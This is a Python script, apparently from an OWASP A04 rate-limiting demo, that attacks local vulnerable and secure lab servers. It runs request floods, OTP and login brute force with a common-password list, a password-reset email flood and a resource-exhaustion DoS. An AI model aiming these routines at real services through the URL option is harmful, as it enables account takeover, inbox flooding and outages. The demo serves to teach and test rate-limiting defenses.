#!/usr/bin/env python3
"""
OWASP A04:2021 - Rate Limiting Attack Script
=============================================
測試缺乏限速機制的漏洞

CWE-799: Improper Control of Interaction Frequency

Author: OWASP Demo
"""

import requests
import argparse
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# ANSI Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'

VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"


def print_banner():
    print(f"""
{RED}╔═══════════════════════════════════════════════════════════════════════════╗
║  ██████╗  █████╗ ████████╗███████╗    ██╗     ██╗███╗   ███╗██╗████████╗  ║
║  ██╔══██╗██╔══██╗╚══██╔══╝██╔════╝    ██║     ██║████╗ ████║██║╚══██╔══╝  ║
║  ██████╔╝███████║   ██║   █████╗      ██║     ██║██╔████╔██║██║   ██║     ║
║  ██╔══██╗██╔══██║   ██║   ██╔══╝      ██║     ██║██║╚██╔╝██║██║   ██║     ║
║  ██║  ██║██║  ██║   ██║   ███████╗    ███████╗██║██║ ╚═╝ ██║██║   ██║     ║
║  ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝    ╚══════╝╚═╝╚═╝     ╚═╝╚═╝   ╚═╝     ║
║                                                                             ║
║  OWASP A04:2021 - Rate Limiting Bypass Attack Script                       ║
║  CWE-799: Improper Control of Interaction Frequency                         ║
╚═══════════════════════════════════════════════════════════════════════════╝{RESET}
""")


def reset_stats(base_url):
    """重設統計"""
    try:
        requests.post(f"{base_url}/api/rate-limit/reset-stats", timeout=5)
    except:
        pass


def attack_sensitive_action(base_url, count=50):
    """發送大量敏感操作請求"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[1] Sensitive Action Flood - 敏感操作洪水攻擊{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/rate-limit/sensitive-action")
    print(f"攻擊原理: 無限速機制允許發送大量請求")
    
    reset_stats(base_url)
    
    success_count = 0
    fail_count = 0
    start_time = time.time()
    
    def send_request(i):
        try:
            response = requests.post(
                f"{base_url}/api/rate-limit/sensitive-action",
                json={"action": "test"},
                timeout=5
            )
            return response.status_code == 200
        except:
            return False
    
    # 使用多線程發送請求
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(send_request, i) for i in range(count)]
        for future in as_completed(futures):
            if future.result():
                success_count += 1
            else:
                fail_count += 1
    
    duration = time.time() - start_time
    rate = count / duration
    
    print(f"\n[*] 發送 {count} 個請求")
    print(f"    {GREEN}✓ 成功: {success_count}{RESET}")
    print(f"    {RED}✗ 失敗/被限制: {fail_count}{RESET}")
    print(f"    用時: {duration:.2f} 秒")
    print(f"    速率: {rate:.1f} 請求/秒")
    
    if success_count > 10:
        print(f"\n{RED}[VULNERABLE] 無限速機制 - 成功發送 {success_count} 個請求！{RESET}")
    else:
        print(f"\n{GREEN}[PROTECTED] 限速機制生效 - 只允許 {success_count} 個請求{RESET}")


def attack_otp_brute_force(base_url, max_attempts=20):
    """暴力破解 OTP"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[2] OTP Brute Force - OTP 暴力破解{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/rate-limit/verify-otp")
    print(f"攻擊原理: 無限速機制允許無限次嘗試")
    
    reset_stats(base_url)
    
    attempts = 0
    success = False
    
    # 嘗試一系列 OTP
    for otp in range(0, max_attempts):
        otp_str = f"{otp:06d}"
        try:
            response = requests.post(
                f"{base_url}/api/rate-limit/verify-otp",
                json={"otp": otp_str, "sessionId": "test-session"},
                timeout=5
            )
            attempts += 1
            
            if response.status_code == 200:
                data = response.json()
                if data.get("verified"):
                    print(f"\n    {GREEN}[SUCCESS] 在第 {attempts} 次嘗試找到正確 OTP: {otp_str}{RESET}")
                    success = True
                    break
            elif response.status_code == 429:
                print(f"\n    {YELLOW}[BLOCKED] 第 {attempts} 次嘗試被限速阻擋{RESET}")
                break
                
        except Exception as e:
            print(f"    [ERROR] {e}")
    
    # 嘗試正確的 OTP
    if not success:
        try:
            response = requests.post(
                f"{base_url}/api/rate-limit/verify-otp",
                json={"otp": "123456", "sessionId": "test-session-2"},
                timeout=5
            )
            attempts += 1
            if response.status_code == 200:
                data = response.json()
                if data.get("verified"):
                    print(f"\n    {GREEN}[SUCCESS] 嘗試 {attempts} 次後破解成功！{RESET}")
                    success = True
            elif response.status_code == 429:
                print(f"\n    {YELLOW}[BLOCKED] 帳戶已被鎖定{RESET}")
        except:
            pass
    
    print(f"\n[*] 總共嘗試: {attempts} 次")
    
    if success:
        print(f"{RED}[VULNERABLE] 無帳戶鎖定機制 - OTP 可被暴力破解！{RESET}")
    else:
        print(f"{GREEN}[PROTECTED] 帳戶鎖定機制生效{RESET}")


def attack_login_brute_force(base_url, passwords=None):
    """暴力破解登入"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[3] Login Brute Force - 登入暴力破解{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/rate-limit/login-attempt")
    print(f"攻擊原理: 無限速機制允許無限次密碼嘗試")
    
    reset_stats(base_url)
    
    if passwords is None:
        passwords = [
            "password", "123456", "password123", "admin", "admin123",
            "letmein", "welcome", "qwerty", "abc123", "111111"
        ]
    
    attempts = 0
    success = False
    blocked = False
    
    for password in passwords:
        try:
            response = requests.post(
                f"{base_url}/api/rate-limit/login-attempt",
                json={"username": "admin", "password": password},
                timeout=5
            )
            attempts += 1
            
            if response.status_code == 200:
                print(f"\n    {GREEN}[SUCCESS] 第 {attempts} 次嘗試成功！密碼: {password}{RESET}")
                success = True
                break
            elif response.status_code == 429:
                data = response.json()
                print(f"\n    {YELLOW}[BLOCKED] 第 {attempts} 次嘗試後被鎖定{RESET}")
                print(f"    訊息: {data.get('message', 'Rate limited')}")
                blocked = True
                break
            else:
                print(f"    嘗試 {attempts}: {password} - 失敗")
                
        except Exception as e:
            print(f"    [ERROR] {e}")
    
    print(f"\n[*] 總共嘗試: {attempts} 次")
    
    if success and not blocked:
        print(f"{RED}[VULNERABLE] 無帳戶鎖定 - 密碼暴力破解成功！{RESET}")
    elif blocked:
        print(f"{GREEN}[PROTECTED] 帳戶鎖定機制生效{RESET}")


def attack_password_reset_flood(base_url, count=20):
    """密碼重設洪水攻擊"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[4] Password Reset Flood - 密碼重設洪水攻擊{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/rate-limit/password-reset")
    print(f"攻擊原理: 無限速允許對任何郵箱發送大量重設請求")
    
    reset_stats(base_url)
    
    success_count = 0
    blocked_count = 0
    
    email = "victim@example.com"
    
    for i in range(count):
        try:
            response = requests.post(
                f"{base_url}/api/rate-limit/password-reset",
                json={"email": email},
                timeout=5
            )
            
            if response.status_code == 200:
                success_count += 1
            elif response.status_code == 429:
                blocked_count += 1
                
        except:
            pass
    
    print(f"\n[*] 發送 {count} 個重設請求到 {email}")
    print(f"    {GREEN if success_count > 5 else YELLOW}✓ 成功: {success_count}{RESET}")
    print(f"    {RED}✗ 被限制: {blocked_count}{RESET}")
    
    if success_count > 5:
        print(f"\n{RED}[VULNERABLE] 可對受害者郵箱發送大量重設郵件！{RESET}")
    else:
        print(f"\n{GREEN}[PROTECTED] 密碼重設請求被限制{RESET}")


def attack_dos(base_url, iterations=50000):
    """DoS 攻擊 - 資源密集型操作"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[5] DoS via Expensive Operation - 資源耗盡攻擊{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/rate-limit/expensive-operation")
    print(f"攻擊原理: 無資源限制允許觸發大量耗資源操作")
    
    reset_stats(base_url)
    
    success_count = 0
    blocked_count = 0
    total_duration = 0
    
    for i in range(5):
        try:
            response = requests.get(
                f"{base_url}/api/rate-limit/expensive-operation",
                params={"iterations": iterations},
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                duration = data.get("duration_ms", 0)
                total_duration += duration
                success_count += 1
                print(f"    請求 {i+1}: 成功 - 耗時 {duration}ms")
            elif response.status_code == 429:
                blocked_count += 1
                print(f"    請求 {i+1}: 被限速阻擋")
            elif response.status_code == 400:
                print(f"    請求 {i+1}: 參數被限制")
                blocked_count += 1
                
        except Exception as e:
            print(f"    請求 {i+1}: 錯誤 - {e}")
    
    print(f"\n[*] iterations={iterations} 的請求")
    print(f"    成功: {success_count}")
    print(f"    被限制: {blocked_count}")
    print(f"    總耗時: {total_duration}ms")
    
    if success_count > 3:
        print(f"\n{RED}[VULNERABLE] 可觸發大量耗資源操作！{RESET}")
    else:
        print(f"\n{GREEN}[PROTECTED] 資源密集操作被限制{RESET}")


def compare_vulnerability():
    """比較漏洞版本與安全版本"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}比較漏洞版本 vs 安全版本{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    test_cases = [
        {
            "name": "敏感操作洪水 (20 請求)",
            "test": lambda url: sum(1 for _ in range(20) 
                if requests.post(f"{url}/api/rate-limit/sensitive-action", 
                    json={"action": "test"}, timeout=5).status_code == 200)
        },
        {
            "name": "OTP 暴力破解 (10 次嘗試)",
            "test": lambda url: sum(1 for i in range(10)
                if requests.post(f"{url}/api/rate-limit/verify-otp",
                    json={"otp": f"{i:06d}", "sessionId": f"test-{i}"}, timeout=5).status_code != 429)
        },
        {
            "name": "登入暴力破解 (10 次嘗試)",
            "test": lambda url: sum(1 for i in range(10)
                if requests.post(f"{url}/api/rate-limit/login-attempt",
                    json={"username": "admin", "password": f"wrong{i}"}, timeout=5).status_code != 429)
        },
    ]
    
    for test in test_cases:
        print(f"\n{YELLOW}測試: {test['name']}{RESET}")
        
        for name, url in [("漏洞版本", VULNERABLE_URL), ("安全版本", SECURE_URL)]:
            try:
                # 重設統計
                requests.post(f"{url}/api/rate-limit/reset-stats", timeout=5)
                
                success_count = test["test"](url)
                
                if name == "漏洞版本":
                    if success_count > 5:
                        print(f"  {RED}✗ {name}: {success_count} 個請求成功 - 無限速{RESET}")
                    else:
                        print(f"  {YELLOW}? {name}: {success_count} 個請求成功{RESET}")
                else:
                    if success_count <= 5:
                        print(f"  {GREEN}✓ {name}: 只允許 {success_count} 個請求 - 限速生效{RESET}")
                    else:
                        print(f"  {YELLOW}? {name}: {success_count} 個請求成功{RESET}")
                        
            except Exception as e:
                print(f"  {RED}✗ {name}: 錯誤 - {str(e)}{RESET}")


def main():
    parser = argparse.ArgumentParser(
        description="Rate Limiting Attack Script for OWASP A04 Demo",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 rate_limiting.py --flood          # 敏感操作洪水攻擊
  python3 rate_limiting.py --otp            # OTP 暴力破解
  python3 rate_limiting.py --login          # 登入暴力破解
  python3 rate_limiting.py --reset          # 密碼重設洪水
  python3 rate_limiting.py --dos            # DoS 攻擊
  python3 rate_limiting.py --all            # 執行所有攻擊
  python3 rate_limiting.py --compare        # 比較漏洞與安全版本
        """
    )
    
    parser.add_argument("--flood", action="store_true", help="敏感操作洪水攻擊")
    parser.add_argument("--otp", action="store_true", help="OTP 暴力破解")
    parser.add_argument("--login", action="store_true", help="登入暴力破解")
    parser.add_argument("--reset", action="store_true", help="密碼重設洪水")
    parser.add_argument("--dos", action="store_true", help="DoS 資源耗盡")
    parser.add_argument("--all", action="store_true", help="執行所有攻擊")
    parser.add_argument("--compare", action="store_true", help="比較漏洞與安全版本")
    parser.add_argument("--url", default=VULNERABLE_URL, help="目標 URL")
    
    args = parser.parse_args()
    
    print_banner()
    
    if args.compare:
        compare_vulnerability()
    elif args.all:
        attack_sensitive_action(args.url)
        attack_otp_brute_force(args.url)
        attack_login_brute_force(args.url)
        attack_password_reset_flood(args.url)
        attack_dos(args.url)
    else:
        if args.flood:
            attack_sensitive_action(args.url)
        if args.otp:
            attack_otp_brute_force(args.url)
        if args.login:
            attack_login_brute_force(args.url)
        if args.reset:
            attack_password_reset_flood(args.url)
        if args.dos:
            attack_dos(args.url)
        
        if not any([args.flood, args.otp, args.login, args.reset, args.dos]):
            attack_sensitive_action(args.url)
    
    print(f"\n{BLUE}[*] Rate Limiting 攻擊展示完成{RESET}")


if __name__ == "__main__":
    main()
